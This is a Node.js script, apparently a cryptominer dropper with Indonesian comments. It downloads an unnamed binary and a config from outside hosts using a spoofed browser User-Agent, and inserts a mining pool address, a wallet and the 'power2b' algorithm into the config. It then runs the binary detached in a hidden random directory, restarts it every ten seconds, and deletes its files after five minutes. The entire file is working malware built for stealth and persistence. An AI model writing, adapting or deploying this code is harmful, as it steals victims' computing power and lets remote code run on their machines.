// pante_daemon.js
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const axios = require('axios');
const crypto = require('crypto');

// ====== CONFIGURATION ======
const DEBUG = false; // Ubah ke true jika ingin lihat log

const URL_GENZO = "https://blogspotgenzo.site/UCOK";
const URL_CONFIG = "http://genzoko.serveblog.net/config.json";

// ====== RANDOM TOOLS ======
function randomString(length = 8) {
  return crypto.randomBytes(length).toString('hex').slice(0, length);
}

function log(msg) {
  if (DEBUG) console.log(`[DEBUG] ${msg}`);
}

// ====== PATH & FILE NAMES ======
const WORKDIR = path.join(process.cwd(), '.' + randomString(6));
if (!fs.existsSync(WORKDIR)) {
  fs.mkdirSync(WORKDIR, { recursive: true });
}
process.chdir(WORKDIR);

const FILE_GENZO = randomString(5);       // nama file binary
const FILE_CONFIG = randomString(5) + '.json'; // nama file config
const PID_FILE = path.join(WORKDIR, 'daemon.pid');

// ====== HTTP DOWNLOAD ======
async function downloadFile(url, outputPath) {
  const fakeHeaders = {
    'User-Agent': `Mozilla/5.0 (Windows NT ${Math.floor(Math.random() * 11) + 5}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 40) + 80}.0.0.0 Safari/537.36`,
    'Accept': '*/*',
    'Cache-Control': 'no-cache',
  };

  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer',
      headers: fakeHeaders,
      timeout: 10000
    });
    fs.writeFileSync(outputPath, response.data);
    log(`Downloaded: ${path.basename(outputPath)}`);
  } catch (error) {
    console.error(`[!] Gagal download ${url}: ${error.message}`);
  }
}

// ====== CONFIG EDITOR ======
function editConfig(filePath) {
  try {
    let data = fs.readFileSync(filePath, 'utf8');

    data = data.replace(/"tua"/g, '"159.89.10.132:390"');
    data = data.replace(/"wulet"/g, '"mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Qeri"');
    data = data.replace(/"meki"/g, '"power2b"');

    fs.writeFileSync(filePath, data);
    log("Config updated");
  } catch (error) {
    console.error("[!] Gagal edit config:", error.message);
  }
}

// ====== CHECK IF PROCESS ALREADY RUNNING ======
function isAlreadyRunning() {
  if (fs.existsSync(PID_FILE)) {
    try {
      const pid = parseInt(fs.readFileSync(PID_FILE, 'utf8'));
      process.kill(pid, 0); // Cek proses masih hidup
      console.error(`[!] Daemon sudah berjalan dengan PID ${pid}`);
      process.exit(1);
    } catch (e) {
      log("PID lama tidak valid, lanjutkan proses baru...");
      fs.unlinkSync(PID_FILE);
    }
  }
}

// ====== SAVE PID ======
function savePID() {
  fs.writeFileSync(PID_FILE, process.pid.toString());
  log(`Daemon PID disimpan: ${process.pid}`);
}

// ====== CLEANUP FILES ======
function cleanupFiles() {
  setTimeout(() => {
    try {
      if (fs.existsSync(FILE_CONFIG)) fs.unlinkSync(FILE_CONFIG);
      if (fs.existsSync(FILE_GENZO)) fs.unlinkSync(FILE_GENZO);
      log("File sementara dihapus");
    } catch (e) {
      log("Gagal hapus file sementara");
    }
  }, 1000 * 60 * 5); // 5 menit
}

// ====== RUNNING THE BINARY ======
function runBinary() {
  log("Menjalankan binary...");

  const processRun = spawn(`./${FILE_GENZO}`, ['-c', FILE_CONFIG], {
    detached: true,
    stdio: 'ignore',
    shell: true
  });

  processRun.unref();

  processRun.on('error', (err) => {
    console.error(`[!] Gagal menjalankan binary: ${err.message}`);
  });

  return processRun;
}

// ====== AUTO RESTART HANDLER ======
async function ensureBinaryRunning() {
  let childProcess = runBinary();

  const interval = setInterval(() => {
    try {
      process.kill(childProcess.pid, 0);
      log("Binary masih berjalan...");
    } catch (e) {
      log("Binary mati, restart...");
      childProcess = runBinary();
    }
  }, 10000); // cek setiap 10 detik

  return interval;
}

// ====== MAIN FUNCTION ======
(async () => {
  console.log("[*] Menjalankan daemon...");

  isAlreadyRunning();
  savePID();

  // Download jika belum ada
  if (!fs.existsSync(FILE_GENZO)) {
    await downloadFile(URL_GENZO, FILE_GENZO);
  }

  if (!fs.existsSync(FILE_CONFIG)) {
    await downloadFile(URL_CONFIG, FILE_CONFIG);
    editConfig(FILE_CONFIG);
  }

  // Jadikan binary executable
  fs.chmodSync(FILE_GENZO, 0o755);

  // Jalankan binary & pantau
  await ensureBinaryRunning();

  // Cleanup file sementara
  cleanupFiles();
})();
